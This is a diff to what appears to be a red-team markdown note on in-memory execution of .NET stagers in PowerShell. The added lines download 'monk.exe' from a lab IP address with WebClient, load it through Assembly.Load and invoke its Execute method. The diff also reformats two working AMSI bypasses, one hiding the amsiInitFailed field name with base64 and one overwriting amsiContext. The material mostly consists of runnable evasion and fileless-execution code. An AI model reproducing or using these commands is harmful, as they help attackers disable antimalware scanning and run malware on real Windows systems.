@@ -82,8 +82,14 @@ Hello World
 You can use this reflection technique to download and run a GruntStager EXE directly from memory, without having it touch disk.  For example:
 
 ```powershell
-PS > $malware = (new-object net.webclient).downloaddata("http://10.8.0.6/http-malw.exe")
-PS > [System.Reflection.Assembly]::Load($malware)
+PS > $monk = (new-object net.webclient).downloaddata("http://192.168.152.100/monk.exe")
+PS > [System.Reflection.Assembly]::Load($monk)
+
+GAC Version Location
+--- ------- --------
+False v4.0.30319
+
+PS > [MonkStager.MonkStager]::Execute()
 ```
 
 __Note:__ .NET 4.8, Assembly.Load is AMSI-aware 🚩
@@ -118,10 +124,9 @@ AMSI : The term 'AMSI' is not recognized as the name of a cmdlet, function, scri
 
 ```powershell
 # Base 64 AMSI bypass
-	[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
-	```
-	
-```powershell
+[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
+
+
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
 ```
 
